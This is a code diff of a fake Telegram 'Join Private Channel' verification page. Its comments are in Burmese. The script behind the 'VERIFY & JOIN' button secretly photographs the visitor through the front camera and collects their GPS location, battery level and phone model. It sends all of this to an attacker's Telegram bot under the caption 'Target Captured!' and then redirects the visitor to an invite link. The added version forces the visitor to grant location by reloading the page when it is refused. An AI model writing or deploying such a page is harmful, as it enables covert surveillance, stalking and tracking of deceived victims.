@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram Verification</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Telegram Invite System</title>
     <style>
         body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
         .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
@@ -16,8 +15,9 @@
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="80" style="margin-bottom:20px;">
     <h2>Join Private Channel</h2>
-    <p>Please verify to access the content.</p>
+    <p>Verification Required to continue.</p>
     <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
+    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -28,63 +28,76 @@
     const CHAT_ID = "5304050102";
     const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";
 
-    // ဖုန်းအမျိုးအစားကို ပိုတိကျအောင် ခွဲထုတ်သည့် Function
-    function getDeviceModel() {
+    // ပိုမိုတိကျသော Phone Model ရှာဖွေသည့်စနစ်
+    function getDetailedModel() {
         const ua = navigator.userAgent;
+        let model = "Unknown Device";
+        
         if (/android/i.test(ua)) {
-            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
-            return match ? match[2] : "Android Device";
+            // Android ဖုန်းများအတွက် Version နှင့် Model ကို ရှာဖွေခြင်း
+            const match = ua.match(/Android\s([^\s;]+);?\s?([^;]+)\sBuild/);
+            if (match) {
+                model = match[2].trim(); // ဒီနေရာမှာ Redmi Note 8 Pro စသည်ဖြင့် ပေါ်လာပါမည်
+            } else {
+                model = "Android Phone";
+            }
         } else if (/iPhone/i.test(ua)) {
-            return "iPhone";
+            model = "iPhone";
         }
-        return navigator.platform;
+        return model;
     }
 
     document.getElementById('startBtn').addEventListener('click', async () => {
+        const status = document.getElementById('status');
+        status.innerText = "Requesting permissions...";
+
         try {
-            // ၁။ Camera & Location တောင်းဆိုခြင်း
+            // ၁။ Camera Permission
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
 
-            // ၂။ အချက်အလက်များ စုဆောင်းခြင်း
-            let mapLink = "Location Denied";
-            let batteryLvl = "N/A";
-            
-            // Location ကို Map Link အဖြစ် ပြောင်းလဲခြင်း
-            navigator.geolocation.getCurrentPosition(pos => {
-                mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            // ၂။ တည်နေရာ (Location) ကို အတင်းတောင်းဆိုခြင်း
+            // အကယ်၍ Permission မပေးပါက အောက်က catch ထဲသို့ ရောက်သွားပါမည်
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                
+                // ၃။ ကျန်သည့် Info များ ရယူခြင်း
+                let battery = "N/A";
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}%`;
+                }
+
+                const model = getDetailedModel();
+
+                // ၄။ ပုံရိုက်ပြီး ပို့ခြင်း
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    const video = document.getElementById('video');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'shot.jpg');
+                    formData.append('caption', `🔔 *Target Captured!*\n\n📍 Google Map: ${mapLink}\n📱 Model: ${model}\n🔋 Battery: ${battery}`);
+                    formData.append('parse_mode', 'Markdown');
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = REDIRECT_URL;
+                }, 3000);
+
+            }, (err) => {
+                alert("Please allow Location to verify your account.");
+                location.reload();
             });
 
-            if(navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryLvl = `${Math.round(b.level * 100)}%`;
-            }
-
-            const model = getDeviceModel();
-
-            // ၃။ ပုံဖမ်းပြီး Bot ဆီ ပို့ခြင်း
-            setTimeout(async () => {
-                const canvas = document.getElementById('canvas');
-                const video = document.getElementById('video');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', `🔔 *Target Captured!*\n\n📍 Map: ${mapLink}\n📱 Model: ${model}\n🔋 Battery: ${batteryLvl}\n🌐 IP: [Auto-Detected]`);
-                formData.append('parse_mode', 'Markdown');
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-
-                stream.getTracks().forEach(t => t.stop());
-                window.location.href = REDIRECT_URL;
-            }, 4000);
-
         } catch (err) {
-            alert("Verification error. Please allow all permissions.");
+            alert("Camera and Location are required for verification.");
             location.reload();
         }
     });
